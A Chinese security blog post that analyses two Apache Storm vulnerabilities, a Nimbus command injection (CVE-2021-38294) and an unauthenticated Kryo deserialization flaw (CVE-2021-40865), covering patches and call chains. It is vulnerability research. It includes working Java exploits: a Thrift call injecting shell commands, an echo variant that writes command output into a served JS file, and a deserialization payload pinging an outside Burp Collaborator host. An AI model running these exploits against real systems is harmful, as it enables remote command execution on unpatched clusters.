---
title: Apache Storm 漏洞分析
url: https://blog.noah.360.net/apache-storm-vulnerability-analysis/
clipped_at: 2024-04-01 16:35:55
category: default
tags: 
 - blog.noah.360.net
---


# Apache Storm 漏洞分析

*Author: 0x28*                                                  

## 0x00 前言

前段时间 Apache Storm 更了两个 CVE，简短分析如下，本篇文章将对该两篇文章做补充。  
[GHSL-2021-086: Unsafe Deserialization in Apache Storm supervisor - CVE-2021-40865](https://securitylab.github.com/advisories/GHSL-2021-086-apache-storm/)  
[GHSL-2021-085: Command injection in Apache Storm Nimbus - CVE-2021-38294](https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/)

## 0x01 漏洞分析

CVE-2021-38294 影响版本为：1.x~1.2.3,2.0.0~2.2.0            
CVE-2021-40865 影响版本为：1.x~1.2.3,2.1.0,2.2.0              

### CVE-2021-38294

#### 1、补丁相关细节

针对 CVE-2021-38294 命令注入漏洞，官方推出了补丁代码 [https://github.com/apache/storm/compare/v2.2.0...v2.2.1#diff-30ba43eb15432ba1704c2ed522d03d588a78560fb1830b831683d066c5d11425](https://github.com/apache/storm/compare/v2.2.0...v2.2.1#diff-30ba43eb15432ba1704c2ed522d03d588a78560fb1830b831683d066c5d11425%EF%BC%89)  
将原本代码中的 bash -c 和 user 拼接命令行执行命令的方式去掉，改为直接传入到数组中，即使 user 为拼接的命令也不会执行成功，带入的 user 变量中会直接成为 id 命令的参数。说明在 ShellUtils 类中调用，传入的 user 参数为可控

![](assets/1711960555-6b449a84b60f68459f5ec818265465b0.png)

因此若传入的 user 参数为 ";whomai;"，则其中 getGroupsForUserCommand 拼接完得到的 String 数组为

`new String[]{"bash","-c","id -gn ; whoami;&& id -Gn; whoami;"}`

而 execCommand 方法为可执行命令的方法，其底层的实现是调用 ProcessBuilder 实现执行系统命令，因此传入该 String 数组后，调用 bash 执行 shell 命令。其中 shell 命令用户可控，从而导致可执行恶意命令。

#### 2、execCommand 命令执行细节

接着上一小节往下捋一捋命令执行函数的细节，ShellCommandRunnerImpl.execCommand () 的实现如下

![](assets/1711960555-369366fba19d20818e2089464b842986.png)

execute () 往后的调用链为 execute ()->ShellUtils.run ()->ShellUtils.runCommand ()

![](assets/1711960555-35ff15721799b8e9ec76108bb5415aad.png)

![](assets/1711960555-d136f7bf466d720747c30b7ec169ea16.png)

最终传入 shell 命令，调用 ProcessBuilder 执行命令。              

![](assets/1711960555-a213316291f9bf4974b2f191eeec86a3.png)

#### **3、调用栈执行流程细节**

POC 中作者给出了调试时的请求栈。                              

```plain
getGroupsForUserCommand:124, ShellUtils (org.apache.storm.utils)getUnixGroups:110, ShellBasedGroupsMapping (org.apache.storm.security.auth)getGroups:77, ShellBasedGroupsMapping (org.apache.storm.security.auth)userGroups:2832, Nimbus (org.apache.storm.daemon.nimbus)isUserPartOf:2845, Nimbus (org.apache.storm.daemon.nimbus)getTopologyHistory:4607, Nimbus (org.apache.storm.daemon.nimbus)getResult:4701, Nimbus$Processor$getTopologyHistory (org.apache.storm.generated)getResult:4680, Nimbus$Processor$getTopologyHistory (org.apache.storm.generated)process:38, ProcessFunction (org.apache.storm.thrift)process:38, TBaseProcessor (org.apache.storm.thrift)process:172, SimpleTransportPlugin$SimpleWrapProcessor (org.apache.storm.security.auth)invoke:524, AbstractNonblockingServer$FrameBuffer (org.apache.storm.thrift.server)run:18, Invocation (org.apache.storm.thrift.server)runWorker:-1, ThreadPoolExecutor (java.util.concurrent)run:-1, ThreadPoolExecutor$Worker (java.util.concurrent)run:-1, Thread (java.lang)
```

根据以上在调用栈分析时，从最终的命令执行的漏洞代码所在处 getGroupsForUserCommand 仅仅只能跟踪到 nimbus.getTopologyHistory () 方法，似乎有点难以判断道作者在做该漏洞挖掘时如何确定该接口对应的是哪个服务和端口。也许作者可能是翻阅了大量的文档资料和测试用例从而确定了该接口，是如何从某个端口进行远程调用。

全文搜索 6627 端口，找到了 6627 在某个类中，被设置为默认值。以及结合在细读了 Nimbus.java 的代码后，关于以上疑惑我的大致分析如下。

Nimbus 服务的启动时的步骤我人为地将其分为两个步骤，第一个是读取相应的配置得到端口，第二个是根据配置文件开启对应的端口和绑定相应的 Service。

首先是启动过程，前期启动过程在 /bin/storm 和 storm.py 中加载 Nimbus 类。在 Nimbus 类中，main ()->launch ()->launchServer () 后，launchServer 中先实例化一个 Nimbus 对象，在 New Nimbus 时加载 Nimbus 构造方法，在这个构造方法执行过程中，加载端口配置。接着实例化一个 ThriftServer 将其与 nimbus 对象绑定，然后初始化后，调用 serve () 方法接收传过来的数据。

![](assets/1711960555-7d37e2d9b690048843fa2f38a7634678.png)

Nimbus 函数中通过 this 调用多个重载构造方法                  

![](assets/1711960555-ea980305c59b872b2de751c39df6cf36.png)

在最后一个构造方法中发现其调用 fromConf 加载配置，并赋值给 nimbusHostPortInfo

![](assets/1711960555-0ef0921c7b39ce14a3792df85b67a3ef.png)

fromConf 方法具体实现细节如下，这里直接设置 port 默认值为 6627 端口    

![](assets/1711960555-0abc247111e0ed25cb136156db5856c8.png)

然后回到主流程线上，server.serve () 开始接收请求                  

![](assets/1711960555-c7c1c2ba268c123f9ad34d27371768a4.png)

至此已经差不多理清了 6627 端口对应的服务的情况，也就是说，因为 6627 端口绑定了 Nimbus 对象，所以可以通过对 6627 端口进行远程调用 getTopologyHistory 方法。

![](assets/1711960555-38c687504d8373535e264ef645b219da.png)

#### **4、关于如何构造 POC**

根据以上漏洞分析不难得出只需要连接 6627 端口，并发送相应字符串即可。已经确定了 6627 端口服务存在的漏洞，可以通过源代码中的的测试用例进行快速测试，避免了需要大量翻阅文档构造 poc 的过程。官方 poc 如下

```plain
import org.apache.storm.utils.NimbusClient;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class ThriftClient {
    public static void main(String[] args) throws Exception {
        HashMap config = new HashMap();
        List<String> seeds = new ArrayList<String>();
        seeds.add("localhost");
        config.put("storm.thrift.transport", "org.apache.storm.security.auth.SimpleTransportPlugin");
        config.put("storm.thrift.socket.timeout.ms", 60000);
        config.put("nimbus.seeds", seeds);
        config.put("storm.nimbus.retry.times", 5);
        config.put("storm.nimbus.retry.interval.millis", 2000);
        config.put("storm.nimbus.retry.intervalceiling.millis", 60000);
        config.put("nimbus.thrift.port", 6627);
        config.put("nimbus.thrift.max_buffer_size", 1048576);
        config.put("nimbus.thrift.threads", 64);
        NimbusClient nimbusClient = new NimbusClient(config, "localhost", 6627);

        // send attack
        nimbusClient.getClient().getTopologyHistory("foo;touch /tmp/pwned;id ");
    }
}
```

在测试类 org/apache/storm/nimbus/NimbusHeartbeatsPressureTest.java 中，有以下代码针对 6627 端口的测试

![](assets/1711960555-ac35bb6f387b9945d1ced5058aa00739.png)

可以看到实例化过程需要传入配置参数，远程地址和端口。配置参数如下，构造一个 config 即可。

![](assets/1711960555-a2805a43c32223a89507c2f4986555bb.png)

并且通过 getClient ().xxx () 对相应的方法进行调用，如下图中调用 sendSupervisorWorkerHeartbeats

![](assets/1711960555-229044ad6400f11669ce75f622006371.png)

且与 getTopologyHistory 一样，该方法同样为 Nimbus 类的成员方法，因此可以使用同样的手法对 getTopologyHistory 进行远程调用

![](assets/1711960555-0887d2d47e65cec78e714086a4445b75.png)

### **CVE-2021-40865**

#### **1、补丁相关细节**

针对 CVE-2021-40865，官方推出的补丁代码，对传过来的数据在反序列化之前若默认配置不开启验证则增加验证（[https://github.com/apache/storm/compare/v2.2.0...v2.2.1#diff-463899a7e386ae4ae789fb82786aff023885cd289c96af34f4d02df490f92aa2](https://github.com/apache/storm/compare/v2.2.0...v2.2.1#diff-463899a7e386ae4ae789fb82786aff023885cd289c96af34f4d02df490f92aa2)），即默认开启验证。

![](assets/1711960555-7cec4b8ca17507f7f3d9da357cf7a676.png)

通过查阅资料可知 ChannelActive 方法为连接时触发验证                

![](assets/1711960555-d752d1b1b08955fe8a9fc47dec2bbd74.png)

可以看到在旧版本的代码上的 channelActive 方法没有做登录时的登录验证。且从补丁信息上也可以看出来这是一个反序列化漏洞的补丁。该反序列化功能存在于 StormClientPipelineFactory.java 中，由于没做登录验证，导致可以利用该反序列化漏洞调用 gadget 执行系统命令。

![](assets/1711960555-d07541073ad860876c80e4cb11b8ac78.png)

#### **2、反序列化漏洞细节**

在 StormClientPipelineFactory.java 中数据流进来到最终进行处理需要经过解码器，而解码器则调用的是 MessageCoder 和 KryoValuesDeserializer 进行处理，KryoValuesDeserializer 需要先进行初步生成反序列化器，最后通过 MessageDecoder 进行解码

![](assets/1711960555-0b7adb4358d9da2d653745f4b5e9465e.png)

最终在数据流解码时触发进入 MessageDecoder.decode ()，在 decode 逻辑中，作者也很精妙地构造了 fake 数据完美走到反序列化最终流程点。首先是读取两个字节的 short 型数据到 code 变量中

![](assets/1711960555-398c903db52232df8815e7b0e890fed6.png)

判断该 code 是否为 - 600，若为 - 600 则取出四个字节作为后续字节的长度，接着去除后续的字节数据传入到 BackPressureStatus.read () 中

![](assets/1711960555-4bfd1bf5577e91ee93fb497548489cc8.png)

并在 read 方法中对传入的 bytes 进行反序列化                        

![](assets/1711960555-007b8f869a2c429477b3d7da82158620.png)

#### **3、调用栈执行流程细节**

尝试跟着代码一直往上回溯一下，找到开启该服务的端口                

```plain
Server.java - new Server(topoConf, port, cb, newConnectionResponse);
WorkerState.java - this.mqContext.bind(topologyId, port, cb, newConnectionResponse); 
Worker.java - loadWorker(IStateStorage stateStorage, IStormClusterState stormClusterState,Map<String, String> initCreds, Credentials initialCredentials)
LocalContainerLauncher.java - launchContainer(int port, LocalAssignment assignment, LocalState state)
Slot.java - run()
ReadClusterState.java - ReadClusterState()
Supervisor.java - launch()
Supervisor.java - launchDaemon()
```

而在 Supervisor.java 中先实例化 Supervisor，在实例化的同时加载配置文件（配置文件 storm.yaml 配置 6700 端口），然后调用 launchDaemon 进行服务加载

![](assets/1711960555-921cad0e03bfe987824b7755cf504a81.png)

读取配置文件细节为会先调用 ConfigUtils.readStormConfig () 读取对应的配置文件

![](assets/1711960555-2967492d0f0af2000757e0416afddfe7.png)

ConfigUtils.readStormConfig() -> ConfigUtils.readStormConfigImpl() -> Utils.readFromConfig()

![](assets/1711960555-2e0c22cea9c1cb6277b7e50c57f36935.png)

可以看到调用 findAndReadConfigFile 读取 storm.yaml                    

![](assets/1711960555-e20d3650a5b3e45d5e743252350dd7e1.png)

读取完配置文件后进入 launchDaemon，调用 launch 方法                                      

![](assets/1711960555-307179c2099c1cbdf44052c602a5551f.png)

在 launch 中实例化 ReadClusterState                                                                            

![](assets/1711960555-17a484fde9329048a0863be799de8b15.png)

在 ReadClusterState 的构造方法中会依次调用 slot.start ()，进入 Slot 的 run 方法。最终调用 LocalContainerLauncher.launchContainer ()，并同时传入端口等配置信息，最终调用 new Server (topoConf, port, cb, newConnectionResponse)，监听对应的端口和绑定 Handler。

#### **4、关于 POC 构造**                              

```Java
import org.apache.commons.io.IOUtils;
import org.apache.storm.serialization.KryoValuesSerializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.URLDNS;

import java.io.*;
import java.math.BigInteger;
import java.net.*;
import java.util.HashMap;

public class NettyExploit {

    /**
     * Encoded as -600 ... short(2) len ... int(4) payload ... byte[]     *
     */
    public static byte[] buffer(KryoValuesSerializer ser, Object obj) throws IOException {
        byte[] payload = ser.serializeObject(obj);
        BigInteger codeInt = BigInteger.valueOf(-600);
        byte[] code = codeInt.toByteArray();
        BigInteger lengthInt = BigInteger.valueOf(payload.length);
        byte[] length = lengthInt.toByteArray();

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream( );
        outputStream.write(code);
        outputStream.write(new byte[] {0, 0});
        outputStream.write(length);
        outputStream.write(payload);
        return outputStream.toByteArray( );
    }

    public static KryoValuesSerializer getSerializer() throws MalformedURLException {
        HashMap<String, Object> conf = new HashMap<>();
        conf.put("topology.kryo.factory", "org.apache.storm.serialization.DefaultKryoFactory");
        conf.put("topology.tuple.serializer", "org.apache.storm.serialization.types.ListDelegateSerializer");
        conf.put("topology.skip.missing.kryo.registrations", false);
        conf.put("topology.fall.back.on.java.serialization", true);
        return new KryoValuesSerializer(conf);
    }

    public static void main(String[] args) {
        try {
            // Payload construction
            String command = "http://k6r17p7xvz8a7wj638bqj6dydpji77.burpcollaborator.net";
            ObjectPayload gadget = URLDNS.class.newInstance();
            Object payload = gadget.getObject(command);

            // Kryo serialization
            byte[] bytes = buffer(getSerializer(), payload);

            // Send bytes
            Socket socket = new Socket("127.0.0.1", 6700);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

其实这个反序列化 POC 构造跟其他最不同的点在于需要构造一些前置数据，让后面被反序列化的字节流走到反序列化方法中，因此需要先构造一个两个字节的 - 600 数值，再构造一个四个字节的数值为序列化数据的长度数值，再加上自带序列化器进行构造的序列化数据，发送到服务端即可。

## **0x02 复现 & 回显 Exp**

### **CVE-2021-38294**

复现如下                                                            

![](assets/1711960555-2ea224698a60bdf13de0e48092a5b0ee.png)

![](assets/1711960555-576966f0f7491e5a8e9aedec4421d55f.png)

调试了一下 EXP，由于是直接的命令执行，因此直接采用将执行结果写入一个不存在的 js 中（命令执行自动生成），访问 web 端 js 即可。

```Java
import com.github.kevinsawicki.http.HttpRequest;
import org.apache.storm.generated.AuthorizationException;
import org.apache.storm.thrift.TException;
import org.apache.storm.thrift.transport.TTransportException;
import org.apache.storm.utils.NimbusClient;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class CVE_2021_38294_ECHO {
    public static void main(String[] args) throws Exception, AuthorizationException {
        String command = "ifconfig";
        HashMap config = new HashMap();
        List<String> seeds = new ArrayList<String>();
        seeds.add("localhost");
        config.put("storm.thrift.transport", "org.apache.storm.security.auth.SimpleTransportPlugin");
        config.put("storm.thrift.socket.timeout.ms", 60000);
        config.put("nimbus.seeds", seeds);
        config.put("storm.nimbus.retry.times", 5);
        config.put("storm.nimbus.retry.interval.millis", 2000);
        config.put("storm.nimbus.retry.intervalceiling.millis", 60000);
        config.put("nimbus.thrift.port", 6627);
        config.put("nimbus.thrift.max_buffer_size", 1048576);
        config.put("nimbus.thrift.threads", 64);
        NimbusClient nimbusClient = new NimbusClient(config, "localhost", 6627);
        nimbusClient.getClient().getTopologyHistory("foo;" + command + "> ../public/js/log.min.js; id");
        String response = HttpRequest.get("http://127.0.0.1:8082/js/log.min.js").body();
        System.out.println(response);
    }

}
```

![](assets/1711960555-c6f56cae2db5714a835fb44db173cb1b.png)

### **CVE-2021-40865**

复现如下                                                            

![](assets/1711960555-3aecb2edd985b1d0ddc0cc1091754315.png)

![](assets/1711960555-ad4e119e24a61db3f0ea23b90644a0fd.png)

该利用暂时没有可用的 gadget 配合进行 RCE。

## **0x03 写在最后**

由于本次分析时调试环境一直起不来，因此直接静态代码分析，可能会有漏掉或者错误的地方，还请师傅们指出和见谅。

## **0x04 参考**

[https://www.w3cschool.cn/apache\_storm/apache\_storm\_installation.html](https://www.w3cschool.cn/apache_storm/apache_storm_installation.html)

[https://securitylab.github.com/advisories/GHSL-2021-086-apache-storm/](https://securitylab.github.com/advisories/GHSL-2021-086-apache-storm/)

[https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/](https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/)

[https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)                      

[https://www.w3cschool.cn/apache\_storm/apache\_storm\_installation.html](https://www.w3cschool.cn/apache_storm/apache_storm_installation.html)

[https://m.imooc.com/wiki/nettylesson-netty02](https://m.imooc.com/wiki/nettylesson-netty02)              

[https://xz.aliyun.com/t/7348](https://xz.aliyun.com/t/7348)
